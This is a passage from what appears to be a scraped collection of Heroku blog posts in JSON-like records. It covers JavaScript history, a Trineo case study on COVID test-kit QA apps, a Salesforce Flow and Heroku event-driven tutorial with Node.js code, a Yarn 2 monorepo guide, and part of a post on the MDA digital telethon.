The first native Developer Tools In addition to the release of V8, Chrome introduced developers to another innovation: Developer Tools that are native to the browser. At the time, features only included element inspection and looking at resources, but the tool was an upgrade from the current tooling and would influence an entire suite of developer tools for front-end development. ( Source ) 2009 10) CommonJS moves to standardize modules In an effort to modularize JavaScript code and take code bases from single file scripts to multi-file source code, the CommonJS project was an effort to elevate JavaScript into language for application development. CommonJS modules would influence the Node.js module system. 11) Node.js takes JavaScript to the back-end JavaScript had gained momentum as a language for the browser for many years before making its way to the back-end. In 2009, an engineer at Joyent, Ryan Dahl, introduced Node.js, an asynchronous event-driven JavaScript runtime at JSConf EU. 12) CoffeeScript sprinkles syntactic sugar Long before types were popularized in JavaScript, there was CoffeeScript, a programming language that compiles to JavaScript and was inspired by Ruby, Python and Haskell. The compiler was originally written in Ruby and didn’t require compatibility from dependencies because it compiled to JavaScript, and it gained traction for exposing the good parts of JavaScript in a simple way. 2010 13) Node.js gets its first package manager Shortly after Node.js was introduced, npm was created. npm (short for Node package manager) would eventually create the standard in managing dependencies for both front-end and back-end applications making it easier to publish, install, and manage shared source code with a project file, the package.json. npm also provided the npm registry, which would supply hundreds of thousands of applications a database to retrieve Node.js dependencies. 14) Express has it’s initial release Inspired by Ruby’s Sinatra, Express.js was released in 2010. It was released with the intention of being a minimal, un-opinionated web framework that provided routing, middleware, and other HTTP utilities. According to GitHub, Express remains the most popular framework for back-end JavaScript developers to date. 15) Modern JavaScript MVC frameworks are born While back-end JavaScript was gaining traction, front-end MVC frameworks were starting to pop up. Most notably, Backbone.js and AngularJS (later rewritten and released as Angular) were starting to be adopted and loved by JavaScript developers. Backbone’s approach to front-end was well-suited for mirroring an application’s business logic, while Angular took a declarative approach that enables a robust web application in the browser. Both frameworks would go on to influence later front-end libraries and frameworks, such as React, Ember.js, and Vue.js. 2011 16) Ember.js stresses convention over configuration In 2011, a forked version of an earlier project called SproutCore, is renamed to Ember.js. Ember introduces JavaScript developers the concept of convention over configuration, in which the developer does not have to think about design decisions that can be standardized across code bases. 2012 17) Static types are introduced to JavaScript developers 2012 was a big year for static typed languages. JavaScript was, until then, a dynamically typed language by design, in that it doesn’t require the developer to declare types when initializing variables or other data structures. Enter TypeScript - an extension of JavaScript that allows developers to write typed JavaScript that is syntactically similar to JavaScript and compiles to JavaScript. Microsoft made the initial release of the project in October of 2012. 2013 18) The world reacts to React In 2013, a developer at Facebook, Jordan Walke, presents a new JavaScript library that does not follow the then-popular MVC convention of JS frameworks. ( Source ) React, a component-based library that was simply the V of MVC, would go on to become one of the most popular libraries of today. 19) Electron puts Node.js into desktop applications Additionally, with the rising popularity of Node.js, there was momentum to repurpose the runtime or other uses. GitHub made use of Node.js as a library with Chromium’s rendering engine and created Electron for desktop applications. Notable desktop applications that use Electron include GitHub Desktop, Slack, and Visual Studio Code. 2015 20) Release of ES2015/ES6 The 6th edition of ECMAScript was released in June of 2015. This specification was anticipated by many JavaScript developers for its inclusion of popular features such as support for export and import of modules (ES modules), declaring constants, and more. (Source ( http://es6-features.org/) ) While the previous version of ECMAScript (ES5) had been released 6 years before, much of the standards released had been worked on since ES3, which was released 16 years before. ( Source ) 21) GraphQL emerges as a REST alternative In 2015, Facebook released GraphQL as an open source project, a querying language for APIs that simplifies request calls between clients and servers to resolve the differences between server-side data schemas and client-side data needs. ( Source ) Due to its popularity, the project would eventually be moved to its own GraphQL Foundation. 22) Node v4 is released 2015 was notable for back-end JavaScript developers because it marked the merging of io.js back into Node.js. Just a year before, Node was forked as io.js in an effort adapt quicker release cycles. When io.js was merged back in, it had already released v3, so it was natural to release Node v4 after the merge as a fresh start for the combined projects. Hereafter, Node would adapt a release cycle that would keep it up to date with the latest V8 releases. 2016 23) JavaScript developers are introduced to lock files In the months following an infamous “left-pad” incident ( Source ), Yarn was released to the JavaScript ecosystem. Yarn was created out of need for more consistency across machines and offline environments running the same JavaScript applications. Yarn introduced the autogenerated lockfile to the JavaScript ecosystem, which would influence package managers to look at developer experience differently moving forward. ( Source ) 2019 24) Node + JS = OpenJS After years of the JS Foundation and Node.js Foundation operating separately, the two organizations merge and become the OpenJS Foundation with goals to increase collaboration and provide a united home for projects across the JavaScript ecosystem. ( Source ) 2020 25) Deno makes a splash with the initial release This year, Node.js creator, Ryan Dahl, made the initial release of Deno, a JavaScript and TypeScript engine that, again, is built on top of V8. The project has generated a lot of interest because of its first-class TypeScript support and, of course, inspiration taken from Node.js. While these landmarks highlight some exciting moments in JavaScript history, there are countless other honorable mentions and important contributions too. The JavaScript ecosystem would not be where it was without the hard work to of developers around the world today. Every pull request, conference talk, and blog post has inspired the next innovation. For that, we thank all of you for your contributions and look forward to the bright future of JavaScript. yarn npm typescript nodejs javascript", "date": "2020-12-04,"},
{"website": "Heroku", "title": "Coding at the Speed of a Pandemic: How Trineo Delivered Apps That Test the Test Kits", "author": ["Sally Vedros"], "link": "https://blog.heroku.com/coding-at-the-speed-of-a-pandemic", "abstract": "Coding at the Speed of a Pandemic: How Trineo Delivered Apps That Test the Test Kits Posted by Sally Vedros December 08, 2020 Listen to this article The need for speed takes on a new meaning in the face of a pandemic. With millions of lives at stake, everyone in the healthcare ecosystem, from medical facilities to laboratories to equipment manufacturers, races to do their part to help curb the spread. With the coronavirus, the world put widespread diagnostic testing at the core of its pandemic response playbook. However, testing is only effective if the test results are accurate — a false negative could not only endanger the individual, but also their entire community. Third-party quality assurance providers play a vital role in testing the tests. They make sure that test equipment and processes adhere to the highest standards. One of the global leaders in this field is the Royal College of Pathologists of Australasia Quality Assurance Programs ( RCPAQAP ). Since the early days of the coronavirus pandemic, the company has assisted with vetting diagnostic testing in Australia. To be an effective partner in Australia’s pandemic response, RCPAQAP needed speed on their side. So, their software development agency, Trineo , hit the ground running and deployed rapid point-of-care quality assurance apps to Heroku in record time — just before test kits began to roll out across the country. The vision: an app platform to QA coronavirus test kits As Australia ramped up coronavirus testing, diagnostic test kits from different suppliers began flooding into the country’s pathology labs. RCPAQAP took on the challenge to develop a new quality assurance program to ensure that these kits performed as expected and that their rapid deployment did not undermine quality standards. To be successful, RCPAQAP’s solution needed to be first and foremost simple to use. Like all frontline health professionals, lab technicians were under a great deal of stress, and any test validation tools had to mitigate the risk of user error or decision fatigue. The solution also had to seamlessly scale to serve a potentially massive increase in testing in the weeks or months to come, as the virus showed no signs of slowing down. In partnership with Trineo, RCPAQAP envisioned two cloud applications that would support both core objectives. A progressive web app for mobile use would allow users to capture and transfer lab testing data and send it to RCPAQAP for quality assurance. An administration portal would allow the company to access and manage test data, as well as share it with others involved in pandemic response, such as healthcare organizations and public health authorities. Both apps needed to be ready to go before test kits were made available — which meant only a few short weeks for development. The Trineo team had to act fast. The context: complex system integrations made it harder to build quickly Trineo’s partnership with RCPAQAP goes back several years. The agency had already built a robust platform to support the company’s ongoing QA programs, featuring a number of deep integrations that enable data sharing with various medical systems and business systems (like Salesforce). The COVID-19 project, however, presented a different kind of challenge. This time, the focus was on development agility (which would enable maximum speed). The Trineo team could have built on top of the existing platform, however development would have been slower, making it harder to deliver the new apps as quickly as the country needed them. The team decided to step back and start fresh. Alice Eller, Director of Project Delivery at Trineo, says: “Just focusing on the new apps in isolation gave us the freedom to be more nimble and move faster, while still leveraging all the knowledge we’d gained from working with RCPAQAP over the years.” The shift: an agile, prototyping-focused methodology The Trineo team sat down with the project manager at RCPAQAP and gathered some basic requirements for the apps to give them a rough shape of what was needed. In a few hours, one developer spun up an initial prototype, deployed it to Heroku, and shared it with the client who could then provide constructive feedback. Having a quick prototype gave everyone a tangible sense of what the app could be — right from the start. With very low effort and cost, the team could capture valuable learnings and work towards an MVP with confidence. Because the project’s time frame was so tight, the Trineo team had no time to take a wrong turn at any point. Everything they built had to be the right thing, and the team couldn’t allow themselves to get stuck down a rabbit hole. The prototyping approach was invaluable because it gave them a quick way to validate an idea and then go build it out properly. Shipping incrementally to stay ahead of the deadline Over the course of four weeks, the team worked on the new platform piece by piece, deploying what was ready to production on Heroku, and then moving on to the next. The basic functionality was there early on, and if the test kits were released earlier than expected, RCPAQAP could have started their program with the apps as is. During this time, some of RCPAQAP’s program logistics were falling into place, such as QR codes for each test kit, and those got incorporated into the app as well. Eventually, the full, end-to-end user flow was completed well before the test kit rollout, and there was even a little extra time to add some bells and whistles. Eller says, “It was a really nice feeling to know that we were ready . We had solid, quality apps in time for our client to help tackle this major crisis that was quickly unfolding.” From testing to validation a sample in just a few clicks To validate a test kit, RCPAQAP uses coronavirus test samples that they know to be either positive or negative. They attach a QR code and unique ID to each sample and ship it out to a testing laboratory. The lab technician then tests the sample using a particular brand of test kit and then scans its QR code on their mobile phone to bring up the RCPAQAP progressive web app. Because the app’s UI is so simple, the technician can quickly enter the test results without fear of mistyping or clicking the wrong button. They also attach a photo of the test kit itself, and submit it with the report. The RCPAQAP receives a notification that the report is available for review, and the team then compares it with the known results. In one case, the team identified a mismatch. RCPAQAP had sent out positive test samples and the reports were coming back negative. Without the photo capture feature in the app, the lab could have concluded that the technician had misinterpreted the results of their test. But the photo showed that the actual test kit was showing an incorrect result. The lab stopped using the test kits and reported the findings to the manufacturer. This goes to show how important the QA process is for lab tests, particularly during a pandemic when one faulty test kit can impact so many lives. Trineo Express on Heroku: a new way of working for clients Prior to the RCPAQAP project, Trineo had been developing a repeatable methodology for quickly prototyping and delivering new apps, and the success of the new test kit apps only energized the team even more. Trineo Express is designed to enable businesses to extract maximum value out of ideas and quickly turn them into real solutions. Says Eller: “At the start of an Express project, we ask ourselves: ‘What is the smallest thing we can put in front of a customer that they will find meaningful?’ And we’ll build on that.” Heroku is the cornerstone of Trineo Express. As with the RCPAQAP apps, Heroku makes it easy for developers to spin up a prototype and iterate quickly without having to spend time on infrastructure concerns. They can also leverage a wide range of Heroku Add-ons to add functionality that demonstrates their ideas. But most importantly, once the pieces of a project get pushed to production, they can stay on Heroku for the long term. Heroku’s seamless scalability allows clients like RCPAQAP to handle massive spikes in traffic without issues. EJ Guren, Head of Marketing at Trineo, believes that the Express offering is particularly ideal for businesses who are struggling during the pandemic: “Many businesses are facing budget constraints, a decrease in consumer activity due to waves of lockdowns, and so on. How can they avoid stagnation or the risk of falling too far behind? We help them continue to invest wisely in their business on an incremental basis, so that when the world recovers, they’re way ahead.” Speed can be exhilarating For the Trineo team, one of the most surprising outcomes of the RCPAQAP project has been the experience itself. Everyone thrived while working in the Express mindset. Rapid iteration allowed the client to see progress and participate fully every step of the way. Clear direction and fast feedback allowed the team to forge ahead knowing they were on the right track. “We could see that we were building something worthwhile, for our client and society,” says Eller. “Everyone felt a sense of urgency, but not stress, and we were able to be really productive every day.” One thing is clear: speed and agility have become the new normal at Trineo. The pandemic fast-tracked this new methodology, and the team looks forward to continuing to practice it well after the crisis is over. Read our Trineo case study for more ways that the agency uses Heroku. Learn more about this project by reading Trineo’s RCPAQAP case study and their client’s article in the Journal of Practical Laboratory Medicine . testing covid health", "date": "2020-12-08,"},
{"website": "Heroku", "title": "Extend Flows with Heroku Compute: An Event-Driven Pattern", "author": ["Chris Marino", "Srini Nirmalgandhi"], "link": "https://blog.heroku.com/extend-flows-heroku-event-driven", "abstract": "Extend Flows with Heroku Compute: An Event-Driven Pattern Posted by Chris Marino and Srini Nirmalgandhi December 11, 2020 Listen to this article This post previously appeared on the Salesforce Architects blog. Event-driven application architectures have proven to be effective for implementing enterprise solutions using loosely coupled services that interact by exchanging asynchronous events. Salesforce enables event-driven architectures (EDAs) with Platform Events and Change Data Capture (CDC) events as well as triggers and Apex callouts, which makes the Salesforce Platform a great way to build all of your digital customer experiences . This post is the first in a series that covers various EDA patterns, considerations for using them, and examples deployed on the Salesforce Platform. Expanding the event-driven architecture of the Salesforce Platform Back in April, Frank Caron wrote a blog post describing the power of EDAs. In it, he covered the event-driven approach and the benefits of loosely coupled service interactions. He focused mainly on use cases where events triggered actions across platform services as well as how incorporating third-party external services can greatly expand the power of applications developed using declarative low-code tools like Salesforce Flow. As powerful as flows can be for accessing third-party services, even greater power comes when your own custom applications, running your own business logic on the Salesforce Platform, are part of flows. API-first, event-driven design is the kind of development that frequently requires collaboration across different members of you team. Low-code builders with domain expertise who are familiar with the business requirements can build the flows. Programmers are typically necessary to develop the back-end services that implement the business logic. An enterprise architect may get involved as well to design the service APIs. However you are organized, you will need to expose your services with APIs and enable them to produce and consume events. The Salesforce Platform enables this with the Salesforce Event Bus , Salesforce Functions , and Streaming API as well as support for OpenAPI specification for external services. Heroku capabilities on the Salesforce Platform include event streaming, relational data stores, and key-value caches seamlessly integrated with elastic compute. These capabilities, combined with deployment automation and hands-off operational excellence, lets your developers focus entirely on delivering your unique business requirements. Seamless integration with the rest of Salesforce makes your apps deployed on Heroku the foundation for complete, compelling, economical, secure, and successful solutions. This post focuses on expanding flows with Heroku compute. Specifically, how to expose Heroku apps as external services and securely access them via flows using Flow Builder as the low-code development environment. Subsequent posts will expand this idea to include event-driven interactions between Heroku apps and the rest of the Salesforce Platform as well as other examples of how Salesforce Platform based EDAs address common challenges we see across many of our customers including: Multi-organization visibility and reporting Shared event bus designs B2C apps with Lightning Web Components Building Salesforce flows with your own business logic Salesforce external services are a great way to access third-party services from a flow. All you need are the services’ OpenAPI spec schema (OAS schema), and you’re set to go. There are some great examples of how to register your external services here , with a more detailed example of how to generate an Apex client and explore your schema here . But what if you want to incorporate custom business logic into your flow app? What if you wanted to extend and complement the declarative programming model of flows with an imperative model with full programming semantics? What if you wanted to make your app available to flow developers in other organizations, or possibly accessed as a stand-alone service behind a Lightning Web Components based app? This kind of service deployment typically requires off-platform development, bringing with it all the complexity and operational overhead that goes with meeting the scalability, availability, and reliability requirements of your business critical apps. The following steps show you how you can deploy your own apps using Heroku on the Salesforce Platform without any of this operational overhead. We’re going to walk through an example of how to build and deploy custom business logic into your own service and access it in a flow. Deployment will be via a Heroku app, which brings the power and flexibility to write your own code, without having to worry about the operational burden of production app deployment or DevOps toolchains. This approach works well in scenarios where you have programmers and low-code builders working together to deploy a new app. The team first collaborates on what the app needs to do and defines the API that a flow can access. Once the API is designed, this specification then becomes the contract between the two teams. As progress is made on each side, they iterate, perfect their design, and ultimately deliver the app. All the code used for this example is available on GitHub , so that you can try it out for yourself. Note: Apex is a great way to customize Salesforce, but there are times when a standalone app might be the better way to go. If your team prefers Python, Node, or some other programming language, or perhaps you already have an app running on premises or in the cloud, and you want to run it all within the secure perimeter of the Salesforce Platform, a standalone Heroku app is the way to go. API spec defines the interface The example application an on-line shopping site that lets users login, browse products, and make a purchase. We’ll describe the process of building out this app in a number of posts, but for this first part we’ll simply build a flow and an external service that lists products and updates inventory in Salesforce. For the API, we’re using a sample API available on Swagger Hub . There are a variety of tools and systems that can do this, including the MuleSoft Anypoint Platform API Designer . For this example, however, we’re using this simple shopping cart spec to bootstrap the API design and provide the initial application stub for development. From the API spec, API Portals can produce server side application stubs to jumpstart application development. In this example, we’ve downloaded the node.js API stub as the starting point for API and app development. We’ve also modified the code so that it can run on Heroku by adding a Procfile and changing the port configuration. If you want to try it yourself, you can Deploy to Heroku , or click the Deploy to Heroku button on the GitHub page. Let’s begin by looking at the initial API spec for the application. These API docs are being served from a deployment of the app stub on Heroku. The actual YAML spec (which we will modify later in this post) is included in the repo as well . As you can see in the spec, there are definitions for each of the methods that specify which parameters are required and what the response payload will look like. Since this is a valid OpenAPI spec, we can register this API as an external service as described in Get Started with External Services . External service authorization The flow needs a Named Credential in Salesforce to access the external service. Salesforce offers many alternatives for how the app can use the Named Credential including per-user credentials that can help you track and control access. For this example, though, we’re going to use a single login for all flow access using basic HTTP authentication. You can find the code that implements this method is in the app included in the repo . App access to the organization is authorized via a Salesforce JWT account token and implemented in the app in SFAuthService.js : 'use strict';\n\nconst jwt = require('salesforce-jwt-bearer-token-flow');\nconst jsforce = require('jsforce');\n\nrequire('dotenv').config();\n\nconst { SF_CONSUMER_KEY, SF_USERNAME, SF_LOGIN_URL } = process.env;\n\nlet SF_PRIVATE_KEY = process.env.SF_PRIVATE_KEY;\nif (!SF_PRIVATE_KEY) {\n    SF_PRIVATE_KEY = require('fs').readFileSync('private.pem').toString('utf8');\n}\n\nexports.getSalesforceConnection = function () {\n    return new Promise(function (resolve, reject) {\n        jwt.getToken(\n            {\n                iss: SF_CONSUMER_KEY,\n                sub: SF_USERNAME,\n                aud: SF_LOGIN_URL,\n                privateKey: SF_PRIVATE_KEY\n            },\n            (err, tokenResponse) => {\n                if (tokenResponse) {\n                    let conn = new jsforce.Connection({\n                        instanceUrl: tokenResponse.instance_url,\n                        accessToken: tokenResponse.access_token\n                    });\n                    resolve(conn);\n                } else {\n                    reject('Authentication to Salesforce failed');\n                }\n            }\n        );\n    });\n}; The private key is configured in Heroku as a configuration variable and is installed when the app is deployed. Register the external service methods Individual methods for the ShoppingService external service are easily added to a flow just as they would be for any external service. Here we’ve added the Get Products and Get Order methods, as shown in Flow Builder below. But since Flow Builder can register an external service method using only the API spec, they are just references to the stub methods that we still need to build out. We’ll program something for them later in this post. These are familiar steps to anyone that has registered an external service for a low, but if you want more detail on how to do this, check out the Get Started with External Services Trailhead . Define the API and build out the methods With the authorizations in place and the methods defined, we are now ready to build out the external service in a way that meets our company’s specific needs. For this, we need to implement each of the API methods. To illustrate this, here is the Node function that has been stubbed out by the API for the Get Order method. It is here that your business logic is implemented. For each of the API methods, we’ve implemented some simple logic that we will use to test interactions with the flow. For example, here’s the code for getting a list of all orders: /**\n * Get list of all orders for the user\n *\n * type String json or xml\n * pOSTDATA List Creates a new employee in DB (optional)\n * returns List\n **/\nexports.typePost_orderPOST = function(type,pOSTDATA) {\n  return new Promise(function(resolve, reject) {\n    var examples = {};\n    examples['application/json'] = [ {\n  \"Item Total Price\" : 1998.0,\n  \"Order Item ID\" : 643,\n  \"Order ID\" : 298,\n  \"Total Order Price\" : 3996.0\n}, {\n  \"Item Total Price\" : 1998.0,\n  \"Order Item ID\" : 643,\n  \"Order ID\" : 298,\n  \"Total Order Price\" : 3996.0\n} ];\n    if (Object.keys(examples).length > 0) {\n      resolve(examples[Object.keys(examples)[0]]);\n    } else {\n      resolve();\n    }\n  });\n} You can examine the code that implements each of the methods in the repo: Get Products Method Post Order Method Get Order Method Get Orders Method Now that we have some simple logic executing in each of these methods, we can build a simple flow that logs in using the Named Credential, accesses the external service, and returns product data. Running this flow shows the product data from the stub app. The successful display of product data here indicates that the flow has been able to successfully log in to the app, call the Get Product method, and get the proper response. Update the API So now that we have our basic flow defined and accessing the app, we can complete the API with new methods necessary for the app to do what it needs to do. Let’s imagine that the app has up-to-date product inventory data and we want to use that data to update the Product object in Salesforce with the current quantity in stock. For this, the app would need to be able to access Salesforce and update the Product object. To do this, the flow needs to make a request to a Get Inventory method. But that method does not yet exist. However, we can modify the API to include any new methods we need. Here our teams work together to determine what the flow needs and what methods are necessary in the app. After discussion, we determine that a single Get Inventory method will satisfy the requirements. So, now we update the API spec to include a new method : /{type}/get_inventory/:\n    get:\n      tags:\n      - \"Internal calls\"\n      description: \"Get Inventory\"\n      operationId: \"typeGet_inventoryGET\"\n      consumes:\n      - \"application/json\"\n      produces:\n      - \"application/json\"\n      - \"application/xml\"\n      parameters:\n      - name: \"type\"\n        in: \"path\"\n        description: \"json or xml\"\n        required: true\n        type: \"string\"\n      - name: \"product_id\"\n        in: \"query\"\n        description: \"Product Id\"\n        required: true\n        type: \"integer\"\n      responses:\n        \"200\":\n          description: \"OK\"\n          schema:\n            type: \"array\"\n            items:\n              $ref: \"#/definitions/Inventory\"\n      security:\n      - basic: [] With this updated API, we can update the external service so that we can use it in a flow. And with the updated API spec, we can automatically generate a stub method as well. From the empty stub method we can complete the function with the necessary logic to access Salesforce directly and update the Product object. Note that it uses the SFAuthService.js code from above and an API token to access the organization data. Platform events and EDA Now that this inventory method is available, we can check the operation with a simple flow that triggers on a Platform Event and updates the Product object. When we run this test flow, it updates the iPhone Product object in the organization. How and when the flow might need to update the product inventory would be up to the actual business needs. However, triggering the flow to update the object can be done using Platform Events. The flow can respond to any Platform Event with a call to the Get Inventory method. Deploy the business logic The process described in this post can go on until the flow and app API converge on a stable design. Once stable, our programmer and low-code builder can complete their work independently to complete the app. The flow designer can build in all the decision logic that surrounds the flow and build out screens for the user to interact with. Separately, and independently from the flow designer, the programmer can code each of the methods in the stub app to implement the business logic. Summary We’ve just started building out this app and running it as an external service. In this post, however, you’ve already seen the the basic steps that would be part of every development cycle: defining an API, registering methods that a flow can call, building out the stub app, and authorizing access for the flow, app, and Platform Event triggers. Future posts in this series will take these basic elements and methodology to expand the flow to execute the business logic contained in the app via user interface elements for a complete process automation solution running entirely on the Salesforce Platform. To learn more, see the Heroku Enterprise Basics Trailhead module and the Flow Basics Trailhead module . Please share your feedback with @SalesforceArchs on Twitter. Flow architecture event driven", "date": "2020-12-11,"},
{"website": "Heroku", "title": "Building a Monorepo with Yarn 2", "author": ["Danielle Adams"], "link": "https://blog.heroku.com/building-a-monorepo-with-yarn-2", "abstract": "Building a Monorepo with Yarn 2 Posted by Danielle Adams December 22, 2020 Listen to this article In true JavaScript fashion, there was no shortage of releases in the JavaScript ecosystem this year. This includes the Yarn project’s release of Yarn 2 with a compressed cache of JavaScript dependencies, including a Yarn binary to reference,  that can be used for a zero-install deployment. Yarn is a package manager that also provides developers a project management toolset. Now, Yarn 2 is now officially supported by Heroku, and Heroku developers are able to take advantage of leveraging zero-installs during their Node.js builds. We’ll go over a popular use case for Yarn that is enhanced by Yarn 2: using workspaces to manage dependencies for your monorepo. We will cover taking advantage of Yarn 2’s cache to manage monorepo dependencies. Prerequisites for this include a development environment with Node installed. To follow these guides, set up an existing Node project that makes use of a package.json too. If you don’t have one, use the Heroku Getting Started with Node.js Project . Workspaces First off, what are workspaces? Workspaces is Yarn’s solution to a monorepo structure for a JavaScript app or Node.js project. A monorepo refers to a project, in this case, a JavaScript project, that has more than one section of the code base. For example, you may have the following set up: /app\n - package.json\n - /server\n   - package.json\n - /ui\n   - package.json Your JavaScript server has source code, but there’s an additional front end application that will be built and made available to users separately. This is a popular pattern for setting up a separation of concerns with a custom API client, a build or testing tool, or something else that may not have a place in the application logic. Each of the subdirectory’s package.json will have their own dependencies. How can we manage them? How do we optimize caching? This is where Yarn workspaces comes in. In the root package.json , set up the subdirectories under the workspaces key. You should add this to your package.json : \"workspaces\": [\n    \"server\",\n    \"ui\"\n] For more on workspaces, visit here: https://yarnpkg.com/features/workspaces Additionally, add the workspaces-tools plugin. This will be useful when running workspace scripts that you’ll use later. You can do this by running: yarn plugin import workspace-tools Setting up Yarn If you’re already using Yarn, you have a yarn.lock file already checked into your code base’s git repository. There’s other files and directories that you’ll need up to set up the cache. If you aren’t already using Yarn, install it globally. npm install -g yarn Note: If you don’t have Yarn >=1.22.10 installed on your computer, update it with the same install command. Next, set up your Yarn version for this code base. One of the benefits of using Yarn 2 is that you’ll have a checked in Yarn binary that will be used by anyone that works on this code base and eliminates version conflicts between environments. yarn set version berry A .yarn directory and .yarnrc.yml file will both be created that need to be checked into git. These are the files that will set up your project’s local Yarn instance. Setting Up the Dependency Cache Once Yarn is set up, you can set up your cache. Run yarn install: yarn Before anything else, make sure to add the following to the .gitignore : # Yarn\n.yarn/*\n!.yarn/cache\n!.yarn/releases\n!.yarn/plugins\n!.yarn/sdks\n!.yarn/versions The files that are ignored will be machine specific, and the remaining files you’ll want to check in. If you run git status , you’ll see the following: Untracked files:\n  (use \"git add <file>...\" to include in what will be committed)\n    .gitignore\n    .pnp.js\n    .yarn/cache/\n    yarn.lock You’ve created new files that will speed up your install process: .pnp.js - This is the Plug’n’Play (PnP) file. The PnP file tells your Node app or build how to find the dependencies that are stored in .yarn/cache . .yarn/cache - This directory will have the dependencies that are needed to run and build your app. yarn.lock - The lock file still is used to lock the versions that are resolved from the package.json . Check all of this in to git, and you’re set. For more information about Yarn 2’s zero-install philosophy, read here: https://yarnpkg.com/features/zero-installs Adding Dependencies to Subdirectories Now that Yarn and the cache are set up, we can start adding dependencies. As initially shown, we have a server directory and a ui directory. We can assume that each of these will be built and hosted differently. For example, my server is written in TypeScript, using Express.js for routing, and running on a Heroku web dyno. For the front end app, it is using Next.js. The build will be run during the app’s build process. Add express to the server dependencies . yarn workspace server add express Additionally, add @types/express and typescript to the devDependencies . You can use the -D flag to indicate that you’re adding devDependencies . yarn workspace server add @types/express typescript -D We now have our dependencies in our server workspace. We just need to create our ui workspace. Next, build a Next.js app with the yarn create command. yarn create next-app ui Finally, run yarn again to update the cache and check these changes into git. Running Scripts with Workspaces The last piece is to run scripts within the workspaces. If you look through your source code, you’ll see that there’s one global cache for all dependencies under your app’s root directory. Run the following to see all the compressed dependencies: ls .yarn/cache Now, lets run build scripts with workspaces. First, set up the workspace. For server, use tsc to build the TypeScript app. You’ll need to set up a TypeScript config and a .ts file first: cd server\nyarn dlx --package typescript tsc --init\ntouch index.ts yarn dlx will run a command from a package so that it doesn’t need to be installed globally. It’s useful for one-off initializing commands, like initializing a TypeScript app. Next, add the build step to the server/package.json . \"scripts\": {\n    \"build\": \"tsc\",\n    \"start\": \"node index.js\"\n}, Change directories back to the application level, and run the build. cd ..\nyarn workspace server build You’ll see that a server/index.js file is created. Add server/*.js to the .gitignore . Since we already have build and start scripts in our Next.js app (created by the yarn create command), add a build script at the root level package.json . \"scripts\": {\n    \"build\": \"yarn workspaces foreach run build\"\n}, This is when the workspaces-tool plugin is used. Run yarn build from your app’s root, and both of your workspaces will build. Open a second terminal, and you’ll be able to run yarn workspace server start and yarn workspace ui start in each terminal and run the Express and Next servers in parallel. Deploy to Heroku Finally, we can deploy our code to Heroku. Since Heroku will run the script is in the package.json under start , add a script to the package.json . \"scripts\": {\n    \"build\": \"yarn workspaces foreach run build\",\n    \"start\": \"yarn workspaces server start\"\n}, Heroku will use the start script from the package.json to start the web process on your app. Conclusion There are plenty more features that Yarn, and specifically Yarn 2, offers that are useful for Heroku developers. Check out the Yarn docs to see if there are additional workspace features that may work nicely with Heroku integration. As always, if you have any feedback or issues, please open an Issue on GitHub . monorepo yarn node javascript", "date": "2020-12-22,"},
{"website": "Heroku", "title": "An Iconic Fundraising Tradition Returns with a 21st Century Twist", "author": ["Abe Dearmer"], "link": "https://blog.heroku.com/muscular-dystrophy-association-telethon", "abstract": "An Iconic Fundraising Tradition Returns with a 21st Century Twist Posted by Abe Dearmer January 21, 2021 Listen to this article The Xplenty platform allows organizations to integrate, process, and prepare data for analytics in the cloud. Xplenty is also available as a Heroku Add-on . Abe Dearmer is the company's COO. Often, innovation sparks innovation in unforeseen ways. In the early 1950’s, television brought the world an entirely new experience that not only changed people’s daily lives, but also created a unique platform for national culture. One of the most beloved and enduring traditions that emerged on this new national stage was the telethon. A combination of “television” and “marathon,” a telethon is a broadcast fundraising event that lasts for several hours or days and features entertainment interspersed with a call for donations. America’s most iconic, and longest-running, event was the Jerry Lewis MDA Labor Day Telethon run on behalf of the Muscular Dystrophy Association (MDA). In 1952, the comedian began hosting an annual Thanksgiving telethon for the charity’s New York chapter, and in 1966, the event moved to Labor Day weekend and went national. When it was discontinued in 2015 (just one year shy of its 50th anniversary), Jerry Lewis and his telethon crew had raised more than two billion dollars for the MDA. Over the years, the once-novel platform of television became an important catalyst for transforming the lives of people suffering from this heartbreaking disease. A new definition of “telethon” The fight against neuromuscular diseases continues, and in 2020, there is still no cure. Fundraising is still a top priority for the MDA, and to develop their next strategy, the organization first looked to its past successes. However, the world has changed dramatically in fifty years. The epicenter of national culture has moved away from broadcast television and onto a plethora of social media platforms. Could the telethon format be adapted to fit this fragmented landscape and engage a new generation of donors? Thanks to the collective efforts of a number of celebrities and technology providers, the MDA ran an all-new telethon this past October. Hosted by another popular comedian, the MDA Kevin Hart Kids Telethon was a two-hour event that streamed across multiple platforms and included comedy, music, gaming, an afterparty, and more. The event did indeed spark engagement and generosity — it raised a whopping $10.5 million to support the MDA, as well as Kevin Hart’s own charity, Help From the Hart . From phone bank to multi-platform donation engine During a Jerry Lewis telethon, an army of volunteers would man the event’s phone lines as people called in to pledge their donations. This time, an all-digital approach needed to pull together a more complex framework, as well as help scale beyond the impressive reach of the old format. A live, multi-stream, interactive event requires the careful orchestration of many different technologies and services. During the weeks leading up to the telethon, the event team worked with fundraising platforms DonorDrive and Tiltify to develop and launch a number of online campaigns, as well as collect donations. To track the funds that flowed in from various sources, the MDA needed a data dashboard that would give them a unified view of activity and allow them to analyze and leverage the data. Their requirements included the ability to: Aggregate fundraising data from both DonorDrive and Tiltify to create a single source of truth. Track donations by channel to understand where donors were engaging with the event. Group donations by location and team in order to present combined fundraising results. Display real-time data on the telethon website showing the total funds raised, the amount received per location, and leaderboards for contributions by individuals and groups. Data fuels the digital telethon Building the telethon’s data system was truly a collaborative effort between the MDA, Salesforce, and Xplenty engineering teams. They deployed an app on Heroku that aggregated data in Heroku Postgres to create a single source of truth. A key part of this process was handled by Xplenty's data integration service. Xplenty provided a data pipeline tool to extract data from DonorDrive and Tiltify into Postgres, as well as an on-platform transformation layer to prepare the data for display. The team then used Xplenty to automatically run the processes on a set schedule that updated the Heroku Postgres instance in near real-time. With the data system set up, the team could then build ways to use it. They created an internal reporting and analytics dashboard to track and access data as needed. These insights helped the organization understand which promotional campaigns were effective and where they may want to focus their efforts during future fundraising campaigns. The telethon website also displayed real-time donation numbers during the event to help keep everyone energized and engaged with MDA’s goals. MDA engineers used Tableau to present data in a visually attractive way that was also easy for anyone to digest. Prospective donors would see exactly where their gift would fall on the leaderboards, potentially inspiring them to donate more. Teamwork makes the dream work The Jerry Lewis telethon was made possible by a wide network of local TV stations — dubbed “the Love Network” by the MDA — which, at its peak, included 213 stations across the country. Today, the organization is working with a new set of partners, but the spirit of teamwork for a great cause remains the same. A close collaboration enabled the MDA to get a first social media telethon under their belt, and they can now create a repeatable format that breathes new life into this traditional event for years to 